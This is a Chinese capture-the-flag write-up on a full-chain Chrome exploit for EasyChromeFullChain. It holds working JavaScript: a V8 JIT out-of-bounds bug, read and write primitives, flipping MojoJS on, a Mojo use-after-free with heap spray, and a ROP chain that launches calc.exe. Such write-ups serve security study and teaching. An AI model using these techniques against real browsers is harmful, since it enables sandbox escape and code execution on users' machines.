> 原文链接: https://www.anquanke.com//post/id/237501 


# 沙箱逃逸分析 AntCTF x D^3CTF EasyChromeFullChain


                                阅读量   
                                **232917**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t017090ca4c6843feb5.png)](https://p0.ssl.qhimg.com/t017090ca4c6843feb5.png)



## 0x00 前言

最近开始着手研究Chrome沙箱逃逸，正好借着本题学习一下。FullChain的漏洞利用一般需要依靠两个漏洞，首先是通过RCE开启Mojo（一种Chrome用于子进程与父进程进行通信的机制），然后通过Mojo漏洞逃离出沙箱。



## 0x01 前置知识

### <a class="reference-link" name="Mojo"></a>Mojo

简单来说，就是一种通信机制，它由两部分组成，首先是C/C++层的具体实现部分，这部分的代码会被一起编译进chrome程序中，并且它将运行在chrome的`browser进程`中(即主进程，没有沙箱的限制)，第二部分就是对外导出的api接口了，在编译好mojom以后，会得到一系列js文件，这些js文件就是对外开放的api库了，我们可以引用它们，从而调用在`browser进程`中的C/C++代码。<br>
Mojo不止有js的导出api库，还有java和C/C++的导出api库

[![](https://p3.ssl.qhimg.com/t01e34925829dae8783.png)](https://p3.ssl.qhimg.com/t01e34925829dae8783.png)

在一般的CTF的RealWord题目中，这些mojo的js库一般会部署到远程的web根目录下，仅仅是为了方便，在真实的场景中，这些js一般不会出现，或者出现在一些我们无法预知的路径中，实际上，由于Chrome开源，因此这些库我们都可以直接编译得到一份，然后将其放置在我们远程的服务器上即可<br>
要使用mojo的导出api，一般我们需要在js中引用两个库，一个是`mojo_bindings.js`，提供了一些Mojo操作用的对象和函数，另一个库就是我们想要调用的模块对应的js文件。

```
&lt;\script type="text/javascript" src="/mojo_bindings.js"&gt;&lt;\/script&gt;
&lt;\script type="text/javascript" src="/third_party/blink/public/mojom/xxxxx/xxxxx.mojom.js"&gt;&lt;\/script&gt;
```

然后，想在代码中使用，只需下列两句话初始化

```
let xxxxx_ptr = new blink.mojom.xxxxx();
   Mojo.bindInterface(blink.mojom.xxxxx.name,mojo.makeRequest(xxxxx_ptr).handle, "process", true);
```

初始化以后，我们就可以使用`xxxxx_ptr.`的方式来调用`browser进程`中的C/C++函数了。这种方式有点类似于Java中的JNI技术，在语言层仅声明函数，具体实现在底层。不同之处在于`mojo`的底层代码运行在`browser进程`,一旦`mojo`的模块代码实现有漏洞，便可能控制`browser进程`的程序流，进而完成了沙箱逃逸。



## 0x02 V8 RCE部分

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

```
diff --git a/src/compiler/simplified-lowering.cc b/src/compiler/simplified-lowering.cc
index ef56d56e44..0d0091fcd8 100644
--- a/src/compiler/simplified-lowering.cc
+++ b/src/compiler/simplified-lowering.cc
@@ -187,12 +187,12 @@ bool CanOverflowSigned32(const Operator* op, Type left, Type right,
   // We assume the inputs are checked Signed32 (or known statically to be
   // Signed32). Technically, the inputs could also be minus zero, which we treat
   // as 0 for the purpose of this function.
-  if (left.Maybe(Type::MinusZero())) `{`
-    left = Type::Union(left, type_cache-&gt;kSingletonZero, type_zone);
-  `}`
-  if (right.Maybe(Type::MinusZero())) `{`
-    right = Type::Union(right, type_cache-&gt;kSingletonZero, type_zone);
-  `}`
+  // if (left.Maybe(Type::MinusZero())) `{`
+  //   left = Type::Union(left, type_cache-&gt;kSingletonZero, type_zone);
+  // `}`
+  // if (right.Maybe(Type::MinusZero())) `{`
+  //   right = Type::Union(right, type_cache-&gt;kSingletonZero, type_zone);
+  // `}`
   left = Type::Intersect(left, Type::Signed32(), type_zone);
   right = Type::Intersect(right, Type::Signed32(), type_zone);
   if (left.IsNone() || right.IsNone()) return false;
@@ -1671,18 +1671,18 @@ class RepresentationSelector `{`
         VisitBinop&lt;T&gt;(node, UseInfo::TruncatingWord32(),
                       MachineRepresentation::kWord32);
         if (lower&lt;T&gt;()) `{`
-          if (lowering-&gt;poisoning_level_ ==
-                  PoisoningMitigationLevel::kDontPoison &amp;&amp;
-              (index_type.IsNone() || length_type.IsNone() ||
+          if ((index_type.IsNone() || length_type.IsNone() ||
                (index_type.Min() &gt;= 0.0 &amp;&amp;
                 index_type.Max() &lt; length_type.Min()))) `{`
             // The bounds check is redundant if we already know that
             // the index is within the bounds of [0.0, length[.
             // TODO(neis): Move this into TypedOptimization?
             new_flags |= CheckBoundsFlag::kAbortOnOutOfBounds;
+            DeferReplacement(node, node-&gt;InputAt(0));
+          `}` else `{`
+            NodeProperties::ChangeOp(
+               node, simplified()-&gt;CheckedUint32Bounds(feedback, new_flags));
           `}`
-          NodeProperties::ChangeOp(
-              node, simplified()-&gt;CheckedUint32Bounds(feedback, new_flags));
         `}`
       `}` else if (p.flags() &amp; CheckBoundsFlag::kConvertStringAndMinusZero) `{`
         VisitBinop&lt;T&gt;(node, UseInfo::CheckedTaggedAsArrayIndex(feedback),
```

该patch位于`CanOverflowSigned32`函数，首先确定该函数的调用者，该函数首先在`VisitSpeculativeIntegerAdditiveOp`中被调用，然后在`simplified-lowering`阶段执行`VisitNode`时，遇到`kSpeculativeSafeIntegerAdd`或者`kSpeculativeSafeIntegerSubtract`时被调用来处理节点。

```
case IrOpcode::kSpeculativeSafeIntegerAdd:
      case IrOpcode::kSpeculativeSafeIntegerSubtract:
        return VisitSpeculativeIntegerAdditiveOp&lt;T&gt;(node, truncation, lowering);
```

```
if (lower&lt;T&gt;()) `{`
      if (truncation.IsUsedAsWord32() ||
          !CanOverflowSigned32(node-&gt;op(), left_feedback_type,
                               right_feedback_type, type_cache_,
                               graph_zone())) `{`
        ChangeToPureOp(node, Int32Op(node));

      `}` else `{`
        ChangeToInt32OverflowOp(node);
      `}`
    `}`
```

为了研究`CanOverflowSigned32`的流程，我们使用如下代码进行测试

```
function opt(b) `{`
  var x = b ? 0 : 1;
  var y = b ? 2 : 3;
  var i = x + y;
  return i;
`}`

for (var i=0;i&lt;0x10000;i++) `{`
   opt(true);
   opt(false);
`}`
```

在`V8.TFBytecodeGraphBuilder`阶段，就已经使用了`SpeculativeSafeIntegerAdd`函数来进行加法运算，到了`V8.TFSimplifiedLowering`阶段，`SpeculativeSafeIntegerAdd`被替换成了`Int32Add`，

[![](https://p4.ssl.qhimg.com/t0116b6f7c36e11eb13.png)](https://p4.ssl.qhimg.com/t0116b6f7c36e11eb13.png)

然而断点`CanOverflowSigned32`的话，发现未断下，说明该函数未被调用，显然是满足了条件`truncation.IsUsedAsWord32`，于是我们修改一下测试用例

```
function opt(b) `{`
  var x = b ? 1 : -1;
  var y = b ? 2 : -0x80000000;
  var i = x + y;
  return i;
`}`

for (var i=0;i&lt;0x10000;i++) `{`
   opt(true);
   //opt(false);
`}`
```

首先，我们修改了变量x和y的范围，使得x为`Range(-1,1)`，y为`Range(-0x80000000,2)`，那么，对于这种情况，`JIT`目前还不知道是否可以使用`int32`的函数来计算，因为它只知道一个Range，如果是计算表达式`-0x80000000+1`的话，不会溢出，但如果是计算表达式`-1+-0x80000000`就会`int32`的范围，发生溢出。因此这种情况下，将会调用`CanOverflowSigned32`来检查。<br>
如果我们不注释掉`opt(false);`，结果如下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d9aea841f947796a.png)

这是因为JIT代码生成时收集的信息已经完整，直接使用`int64`的函数了。也不会去调用`CanOverflowSigned32`函数。<br>
现在知道如何触发`CanOverflowSigned32`函数以后，我们就可以在该函数下断点，然后进行调试

```
In file: /home/sea/Desktop/v8/src/compiler/simplified-lowering.cc
   185 bool CanOverflowSigned32(const Operator* op, Type left, Type right,
   186                          TypeCache const* type_cache, Zone* type_zone) `{`
   187   // We assume the inputs are checked Signed32 (or known statically to be
   188   // Signed32). Technically, the inputs could also be minus zero, which we treat
   189   // as 0 for the purpose of this function.
 ► 190   if (left.Maybe(Type::MinusZero())) `{`
   191     left = Type::Union(left, type_cache-&gt;kSingletonZero, type_zone);
   192   `}`
   193   if (right.Maybe(Type::MinusZero())) `{`
   194     right = Type::Union(right, type_cache-&gt;kSingletonZero, type_zone);
   195   `}`
pwndbg&gt; p left.Min()
$2 = -1
pwndbg&gt; p left.Max()
$3 = 1
pwndbg&gt; p right.Min()
$4 = -2147483648
pwndbg&gt; p right.Max()
$5 = 2
```

可以知道，这里，`left`就是`x`，而`right`就是`y`，被patch的这段代码

```
190   if (left.Maybe(Type::MinusZero())) `{`
   191     left = Type::Union(left, type_cache-&gt;kSingletonZero, type_zone);
   192   `}`
   193   if (right.Maybe(Type::MinusZero())) `{`
   194     right = Type::Union(right, type_cache-&gt;kSingletonZero, type_zone);
   195   `}`
```

其作用是通过与`0`进行`Union`，那么，如果`left`或者`right`中存在`-0`的话，会先转换为`0`。那么我们来继续分析一下，如果`-0`不被转换，会存在什么情况？<br>
首先，我们修改一下测试用例，添加一个`-0`

```
function opt(b) `{`
  var x = b ? -1 : -0;
  var y = b ? 2 : -0x80000000;
  var i = x + y;
  return i;
`}`

for (var i=0;i&lt;0x10000;i++) `{`
   opt(true);
`}`
```

主要是下面这里做`Intersect`时，将出现问题，因为`-0`不属于`Type::Signed32()`类型

```
196   left = Type::Intersect(left, Type::Signed32(), type_zone);
   197   right = Type::Intersect(right, Type::Signed32(), type_zone);
 ► 198   if (left.IsNone() || right.IsNone()) return false;
```

正常情况下，结果是这样的

```
193   if (right.Maybe(Type::MinusZero())) `{`
   194     right = Type::Union(right, type_cache-&gt;kSingletonZero, type_zone);
   195   `}`
   196   left = Type::Intersect(left, Type::Signed32(), type_zone);
   197   right = Type::Intersect(right, Type::Signed32(), type_zone);
 ► 198   if (left.IsNone() || right.IsNone()) return false;
   199   switch (op-&gt;opcode()) `{`
   200     case IrOpcode::kSpeculativeSafeIntegerAdd:
   201       return (left.Max() + right.Max() &gt; kMaxInt) ||
   202              (left.Min() + right.Min() &lt; kMinInt);
   203 
pwndbg&gt; p left.Min()
$9 = -1
pwndbg&gt; p left.Max()
$10 = 0
```

patch以后结果是这样的

```
pwndbg&gt; p left.Min()
$1 = -1
pwndbg&gt; p left.Max()
$3 = -1
```

即`-0`丢失了,`x`由`Range(-1,-0)`变成了`Range(-1,-1)`，显然，这将导致溢出检测出现问题，我们直接继续修改测试用例，将加法改成减法,那么`Range(-1,-1)-Range(-0x80000000,2)`显然没有超过`int32`，于是`CanOverflowSigned32`返回`false`，没有检查出溢出。

```
function opt(b) `{`
  var x = b ? -1 : -0;
  var y = b ? 2 : -0x80000000;
  var i = x - y;
  return i;
`}`

for (var i=0;i&lt;0x10000;i++) `{`
   opt(true);
`}`

print(opt(false));
```

虽然输出的值仍然是`2147483648`，但实际上，cpu溢出标志位已经被设置，因此如果我们使用`==`与`-0x80000000`，将返回`true`，正常情况下是`false`。于是构造POC如下

```
function opt(b) `{`
  var x = b ? -1 : -0;
  var y = b ? 2 : -0x80000000;
  var i = x - y;
  return i == -0x80000000;
`}`

for (var i=0;i&lt;0x10000;i++) `{`
   opt(true);
`}`

print(opt(false));
```

### <a class="reference-link" name="OOB%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0"></a>OOB数组构造

我们注意到，还有一处patch

```
-          if (lowering-&gt;poisoning_level_ ==
-                  PoisoningMitigationLevel::kDontPoison &amp;&amp;
-              (index_type.IsNone() || length_type.IsNone() ||
+          if ((index_type.IsNone() || length_type.IsNone() ||
                (index_type.Min() &gt;= 0.0 &amp;&amp;
                 index_type.Max() &lt; length_type.Min()))) `{`
             // The bounds check is redundant if we already know that
             // the index is within the bounds of [0.0, length[.
             // TODO(neis): Move this into TypedOptimization?
             new_flags |= CheckBoundsFlag::kAbortOnOutOfBounds;
+            DeferReplacement(node, node-&gt;InputAt(0));
```

此处patch的作用是在一些情况下将`checkbounds`节点消除，由于高版本V8已经不会将`checkbounds`节点直接消除，因此出题者为了降低难度增加了这个patch。构造OOB的数组过程如下，其过程比较简单

```
var length_as_double = p64f(0x08042a89,0x200000);
function opt(b) `{`
  //Range(-1,-0)
  var x = b ? -1 : -0;
  //Range(-1,-0x80000000)
  var y = b ? 1 : -0x80000000;

  //Range(-1,0)
  var i = ((x - y) == -0x80000000);
  if (b) i = -1;

  //将i转换为数字，否则会进行Deoptimization
  //Range(-1,0)
  //reality:1
  i = i &gt;&gt; 0;
  //Range(0,1)
  //reality:2
  i = i + 1;
  //Range(0,2)
  //reality:4
  i = i * 2;
  //Range(1,3)
  //reality:5
  i = i + 1
  var arr = [1.1,2.2,3.3,4.4,5.5];
  var oob = [1.1,2.2];
  arr[i] = length_as_double;
  return oob;
`}`
for(let i = 0; i &lt; 0x20000; i++)
  opt(true);

var oob = opt(false);
oob.length = 0x1000;
```

查看一下IR图，在`V8.TFEscapeAnalysis`阶段时，还存在`CheckBound`节点

[![](https://p3.ssl.qhimg.com/t01d0cbf22e8ab75746.png)](https://p3.ssl.qhimg.com/t01d0cbf22e8ab75746.png)

然而到了`V8.TFSimplifiedLowering`阶段，该节点消除了，于是数组可以越界

[![](https://p1.ssl.qhimg.com/t01b310cdf5564f51f1.png)](https://p1.ssl.qhimg.com/t01b310cdf5564f51f1.png)

构造出OOB数组以后，只需接下来布局几个对象，即可轻松实现`addressOf`，`read64`，`write64`等原语，实现任意地址读写。

```
var obj_arr = [`{``}`];
var float_arr = new Float64Array(1.1,2.2);
var arr_buf = new ArrayBuffer(0x1000);
var adv = new DataView(arr_buf);

var compression_high = u64f(oob[0x1d])[0];
print("compression_high=" + compression_high.toString(16));

function addressOf(obj) `{`
   obj_arr[0] = obj;
   var low = BigInt(u64f(oob[0x9])[1]) - 0x1n;
   var addr = low | (BigInt(compression_high) &lt;&lt; 32n);
   return addr;
`}`

function read64(addr) `{`
   oob[0x22] = p64f(0,big2int(addr));
   oob[0x23] = p64f(big2int(addr &gt;&gt; 32n),0);
   return adv.getBigUint64(0,true);
`}`

function write64(addr,value) `{`
   oob[0x22] = p64f(0,big2int(addr));
   oob[0x23] = p64f(big2int(addr &gt;&gt; 32n),0);
   adv.setBigUint64(0,value,true);
`}`
```

### <a class="reference-link" name="%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"></a>地址泄露

我们使用`addressOf`泄露出`chrome.dll`的地址，然后后续就可以计算出一些gadgets的地址

```
var window_addr = addressOf(window);
chrome_dll_base = read64(window_addr+0x10n) - 0x7e86298n;
console.log("chrome_dll_base=0x" + chrome_dll_base.toString(16));
```



## 0x03 沙箱逃逸Mojo部分

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

```
+void RenderFrameHostImpl::CreateAntNest(
+    mojo::PendingReceiver&lt;antctf::mojom::AntNest&gt; receiver) `{`
+  mojo::MakeSelfOwnedReceiver(std::make_unique&lt;AntNestImpl&gt;(this),
+                                std::move(receiver));
+`}`
```

在`CreateAntNest`创建实例时，使用`std::make_unique&lt;AntNestImpl&gt;(this)`，创建了一个`AntNestImpl`对象，并使用`unique`智能指针进行管理，那么意味着这个`AntNestImpl`对象的生命周期与通信管道绑定了，在js层，我们可以通过`xxx.ptr.reset()`来手动释放。`this指针`也就是`RenderFrameHostImpl`对象的指针被保存于`AntNestImpl`对象中

```
+AntNestImpl::AntNestImpl(
+        RenderFrameHost* render_frame_host)
+        : render_frame_host_(render_frame_host)`{``}`
```

并且在`AntNestImpl::Store`和`AntNestImpl::Fetch`函数中，有调用`render_frame_host_`中的虚表函数

```
+void AntNestImpl::Store(const std::string &amp;data)`{`
+    size_t depth = render_frame_host_-&gt;GetFrameDepth();
+    if(depth == 0 || depth &gt; 10)`{`
+        return;
+    `}`
+    size_t capacity = depth * 0x100;
+    size_t count = capacity &lt; data.size() ? capacity : data.size();
+    
+    container_.emplace(
+        std::make_pair(depth, data.substr(0, count))
+    );
+`}`
+
+void AntNestImpl::Fetch(FetchCallback callback)`{`
+    size_t depth = render_frame_host_-&gt;GetFrameDepth();
+    if(depth == 0 || depth &gt; 10)`{`
+        std::move(callback).Run("error depth");
+        return;
+    `}`
+    auto it = container_.find(depth);
+    if(it == container_.end())`{`
+        std::move(callback).Run("not yet stored");
+        return;
+    `}`
+
+    std::move(callback).Run(it-&gt;second);
+`}`
```

然而该对象不会随着`render_frame_host_`对象的销毁而销毁，这意味着即使`render_frame_host_`被释放了,其指针仍然在`AntNestImpl`对象中，我们仍然可以对其相关函数进行调用，这就造成了UAF。

### <a class="reference-link" name="%E5%BC%80%E5%90%AFMojo%E5%8A%9F%E8%83%BD"></a>开启Mojo功能

正常情况下，`chrome`启动时是没有开启`Mojo`支持的，除非启动时加上选项`--enable-blink-features=MojoJS`，开启`Mojo`的判断逻辑如下

```
void RenderFrameImpl::DidCreateScriptContext(v8::Local&lt;v8::Context&gt; context,
                                             int world_id) `{`
  if (((enabled_bindings_ &amp; BINDINGS_POLICY_MOJO_WEB_UI) ||
       enable_mojo_js_bindings_) &amp;&amp;
      IsMainFrame() &amp;&amp; world_id == ISOLATED_WORLD_ID_GLOBAL) `{`
    // We only allow these bindings to be installed when creating the main
    // world context of the main frame.
    blink::WebContextFeatures::EnableMojoJS(context, true);
  `}`
```

从中可以看出，只有`main frame`才可以支持`Mojo`，判断`main frame`是通过`IsMainFrame`函数来判断，实质就是`frame`对象中的一个字段，可以用任意地址读写将其修改为`1`，即可满足这一个条件，然而第二个条件就是`enable_mojo_js_bindings_`为真或者`enabled_bindings_`为`BINDINGS_POLICY_MOJO_WEB_UI`，即`2`，由于我们在V8方面已经可以任意地址读写，只需修改相关`RenderFrameImpl`对象中的一些字段，然后在js层使用`window.location.reload();`重新加载页面，即可开启Mojo。一个网页中可能会用多个`RenderFrameImpl`对象，我们可以使用如下方法在一个网页中添加一个`iframe`，其对应着`RenderFrameImpl`对象。

```
var iframe = document.createElement("iframe");
      iframe.src = "child.html";
      document.body.appendChild(iframe);
```

其中`child.html`内容如下

```
&lt;\html&gt;
    &lt;\script type="text/javascript" src="/mojo_bindings.js"&gt;&lt;\/script&gt;
    &lt;\script src="/third_party/blink/public/mojom/ant_nest/ant_nest.mojom.js"&gt;&lt;\/script&gt;
    &lt;\script src="/enable_mojo.js"&gt;&lt;\/script&gt;
    &lt;\script&gt;
        if (checkMojo())  `{`
           antNestPtr = new antctf.mojom.AntNestPtr();
           Mojo.bindInterface(antctf.mojom.AntNest.name,
                mojo.makeRequest(antNestPtr).handle, "context", true);
           antNestPtr.store("aaaabbbb");
        `}` else `{`
           enable_mojo();
           window.location.reload();
        `}`
    &lt;\/script&gt;
&lt;\/html&gt;
```

这些`RenderFrameImpl`对象，通过`g_frame_map`存储，这是一个全局变量，其定义如下

```
typedef std::map&lt;blink::WebFrame*, RenderFrameImpl*&gt; FrameMap;
base::LazyInstance&lt;FrameMap&gt;::DestructorAtExit g_frame_map =
    LAZY_INSTANCE_INITIALIZER;
```

可以大致知道它是一个`std::map`容器，由于题目给我们的`chrome.dll`是去掉符号的，但幸运的是保留了一些调试信息，因此可以根据一些调试信息来定位`g_frame_map`的位置，不然就得重新编译一份版本一样的进行比对。可以通过IDA过滤字符串`render_frame_impl.cc`，然后定位到该字符串，交叉引用，列出一些函数，然后查看函数，找到一些特征，然后再加以动态调试观察

[![](https://p0.ssl.qhimg.com/t0115520447550fa34e.png)](https://p0.ssl.qhimg.com/t0115520447550fa34e.png)

可以确定`7FF87C478E80`这个位置就是`g_frame_map`，其偏移为`0x8688e80`，于是，我们可以遍历`g_frame_map`，修改每一个`RenderFrameImpl`对象里的信息，使其满足开启`Mojo`的条件

```
function enable_mojo() `{`
   var g_frame_map_addr = chrome_dll_base + 0x8688e80n;
   console.log("g_frame_map_addr=0x" + g_frame_map_addr.toString(16));
   var begin_ptr = read64(g_frame_map_addr + 0x8n);
   while (begin_ptr != 0n) `{`
      var render_frame_ptr = read64(begin_ptr + 0x28n);
      console.log("render_frame_ptr=0x" + render_frame_ptr.toString(16));
      var enabled_bindings_addr = render_frame_ptr + 0x5acn;
      console.log("enabled_bindings_addr=0x" + enabled_bindings_addr.toString(16));
      write32(enabled_bindings_addr,2);
      var is_main_frame_addr = render_frame_ptr + 0xc8n;
      console.log("is_main_frame_addr=0x" + is_main_frame_addr.toString(16));
      write8(is_main_frame_addr,1);

      begin_ptr = read64(begin_ptr + 0x8n);
   `}`
   resetBacking_store();
   return true;
`}`
```

### <a class="reference-link" name="%E6%B3%84%E9%9C%B2RenderFrameImpl%E5%AF%B9%E8%B1%A1%E5%9C%B0%E5%9D%80"></a>泄露RenderFrameImpl对象地址

制造UAF比较简单，然后我们可以利用`mojo`自带的`BlobRegistry`对象进行`heap spray`将数据布局，伪造好`render_frame_host_`的虚表，利用`BlobRegistry`进行`heap spray`的方法已经被国外大佬封装为函数，几乎可以在`Mojo`这一类UAF中统一使用。

```
function getAllocationConstructor() `{`
   let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
   Mojo.bindInterface(blink.mojom.BlobRegistry.name,mojo.makeRequest(blob_registry_ptr).handle, "process", true);

   function Allocation(size=280) `{`
      function ProgressClient(allocate) `{`
         function ProgressClientImpl() `{`
         `}`
         ProgressClientImpl.prototype = `{`
            onProgress: async (arg0) =&gt; `{`
               if (this.allocate.writePromise) `{`
                  this.allocate.writePromise.resolve(arg0);
               `}`
            `}`
         `}`
         this.allocate = allocate;

         this.ptr = new mojo.AssociatedInterfacePtrInfo();
         var progress_client_req = mojo.makeRequest(this.ptr);
         this.binding = new mojo.AssociatedBinding(blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req);

         return this;
      `}`

      this.pipe = Mojo.createDataPipe(`{`elementNumBytes: size, capacityNumBytes: size`}`);
      this.progressClient = new ProgressClient(this);
      blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, this.progressClient.ptr).then((res) =&gt; `{`
         this.serialized_blob = res.blob;
      `}`);
      this.malloc = async function(data) `{`
         promise = new Promise((resolve, reject) =&gt; `{`
            this.writePromise = `{`resolve: resolve, reject: reject`}`;
         `}`);
         this.pipe.producer.writeData(data);
         this.pipe.producer.close();
         written = await promise;
         console.assert(written == data.byteLength);
      `}`

      this.free = async function() `{`
         await this.serialized_blob.blob.ptr.reset();
      `}`

      this.read = function(offset, length) `{`
         this.readpipe = Mojo.createDataPipe(`{`elementNumBytes: 1, capacityNumBytes: length`}`);
         this.serialized_blob.blob.readRange(offset, length, this.readpipe.producer, null);
         return new Promise((resolve) =&gt; `{`
            this.watcher = this.readpipe.consumer.watch(`{`readable: true`}`, (r) =&gt; `{`
               result = new ArrayBuffer(length);
               this.readpipe.consumer.readData(result);
               this.watcher.cancel();
               resolve(result);
            `}`);
         `}`);
      `}`

      this.readQword = async function(offset) `{`
         let res = await this.read(offset, 8);
         return (new DataView(res)).getBigUint64(0, true);
      `}`

      return this;
   `}`

   async function allocate(data) `{`
      let allocation = new Allocation(data.byteLength);
      await allocation.malloc(data);
      return allocation;
   `}`
   return allocate;
`}`
```

为了泄露`RenderFrameImpl`对象地址，我们可以将`GetFrameDepth`函数伪造为某一类特殊函数，首先能够正常被调用且返回，其次可以往我们能够控制的地方写入一些对象地址。一个在CFG绕过中的思想就可以用到这里了，我们将`GetFrameDepth`函数指针伪造为`RtlCaptureContext`，

```
0:000&gt; r
rax=00007ff87c342190 rbx=000000006b00c513 rcx=0000022c35d045e0
rdx=0000004b4c3fe140 rsi=0000022c365f2e30 rdi=0000004b4c3fe140
rip=00007ff874e2c47b rsp=0000004b4c3fe070 rbp=0000000000000002
 r8=0000000000000000  r9=0000000000000000 r10=0000000000008000
r11=0000004b4c3fdfc0 r12=0000022c365677c0 r13=0000004b4c3fe7c0
r14=0000022c365f2e30 r15=0000000000000000
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
chrome!ovly_debug_event+0x1039e9b:
00007ff8`74e2c47b ff90c8000000    call    qword ptr [rax+0C8h]
```

注意到此时`rcx`指向的就是`RenderFrameImpl`对象地址，我们想要泄露的就是这个值，我们看一下`RtlCaptureContext`的代码

```
.text:00000001800A0D10                 pushfq
.text:00000001800A0D12                 mov     [rcx+78h], rax
.text:00000001800A0D16                 mov     [rcx+80h], rcx
.text:00000001800A0D1D                 mov     [rcx+88h], rdx
.text:00000001800A0D24                 mov     [rcx+0B8h], r8
.text:00000001800A0D2B                 mov     [rcx+0C0h], r9
...........................
```

一句`mov     [rcx+80h], rcx`将`rcx`的值保存到了`RenderFrameImpl`对象内部，然后我们使用`BlobRegistry`对象将该处的数据读取出来就可以得到地址了。官方WP的做法也是这个原理，只不过他使用的是`content::WebContentsImpl::GetWakeLockContext`这个函数。所以，我们可以将虚表指针伪造为IAT表地址，使得`call    qword ptr [rax+0C8h]`正好调用到`RtlCaptureContext`，然后我们将数据读出。

```
//伪造RenderFrameHost对象
      const fakeRFH = new BigUint64Array(RenderFrameHost_SIZE / 8).fill(0x4141414141414141n);
      //vtable
      fakeRFH[0] = RtlCaptureContext_iat - 0xc8n;

      //heap spray
      for (var i=0;i&lt;spray_count;i++) `{`
         spray_arr.push(await allocate(fakeRFH.buffer));
      `}`
      //call RtlCaptureContext
      await antNestPtr.store("")
      //now leak the address
      var rfh_addr = -1;
      //var allocation;
      for (var i=0;i&lt;spray_count;i++) `{`
         allocation = spray_arr[i];
         var x = await allocation.readQword(0x80);
         if (x != 0x4141414141414141n) `{`
            rfh_addr = x;
            break;
         `}`
      `}`
      if (rfh_addr == -1) `{`
         return false;
      `}`
```

### <a class="reference-link" name="ROP"></a>ROP

现在，准备工作都做好了，那么就可以直接进行ROP了

```
//释放blob，重新heap spray
      await allocation.free();
      console.log("rfh_addr=0x" + rfh_addr.toString(16));
      //0x00000001814fbfae : xchg rax, rsp ; ret
      var xchg_rax_rsp = chrome_dll_base + 0x14fbfaen;
      //0x00000001850caadf : mov rax, qword ptr [rcx + 0x10] ; add rcx, 0x10 ; call qword ptr [rax + 0x158]
      var adjust_register = chrome_dll_base + 0x50caadfn;
      //0x0000000184ebc82f : add rsp, 0x158 ; ret
      var add_rsp_158 = chrome_dll_base + 0x4ebc82fn;
      var shellExecuteA = chrome_dll_base + 0x3FA9C0Fn;
      var pop_rsi = chrome_dll_base + 0x13b8n;
      fakeRFH.fill(0n);
      //fake
      fakeRFH[0] = rfh_addr;
      fakeRFH[0x10 / 0x8] = rfh_addr + 0x18n;
      fakeRFH[0x18 / 0x8] = add_rsp_158;

      fakeRFH[0xc8 / 0x8] = adjust_register;
      fakeRFH[0x170 / 0x8] = xchg_rax_rsp;

      //now rop
      fakeRFH[0x178 / 0x8] = pop_rsi;
      fakeRFH[0x180 / 0x8] = rfh_addr + 0x1c0n;
      fakeRFH[0x188 / 0x8] = shellExecuteA;
      fakeRFH[0x1b0 / 0x8] = 0n;
      fakeRFH[0x1b8 / 0x8] = 0x3n;

      //cmd
      var cmd = "calc.exe\x00";
      var cmd_buf = new Uint8Array(fakeRFH.buffer);
      for (var i=0;i&lt;cmd.length;i++) `{`
         cmd_buf[0x1c0 + i] = cmd.charCodeAt(i);
      `}`

      //heap spray
      for (var i=0;i&lt;spray_count;i++) `{`
         await allocate(fakeRFH.buffer);
      `}`

      //run
      await antNestPtr.store("");
```

效果如下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t018551319636bf1e64.png)



## 0x04 感想

Chrome沙箱逃逸这一块做起来还是不错的，也没那么难。通过学习，收获了许多。



## 0x05 参考

[chromium 之 ipc (mojo) 消息机制](https://blog.csdn.net/dangwei_90/article/details/110407234)<br>[Mojo docs (go/mojo-docs)](https://chromium.googlesource.com/chromium/src/+/master/mojo/README.md)<br>[SCTF2020-EasyMojo](https://github.com/SycloverSecurity/SCTF2020/tree/master/Pwn/EasyMojo)<br>[利用 Mojo IPC 的 UAF 漏洞逃逸 Chrome 浏览器沙箱](https://www.4hou.com/posts/vD2V)<br>[90分钟加时依然无解 | AntCTF x D^3CTF [EasyChromeFullChain] Writeup](https://mp.weixin.qq.com/s/Gfo3GAoSyK50jFqOKCHKVA)
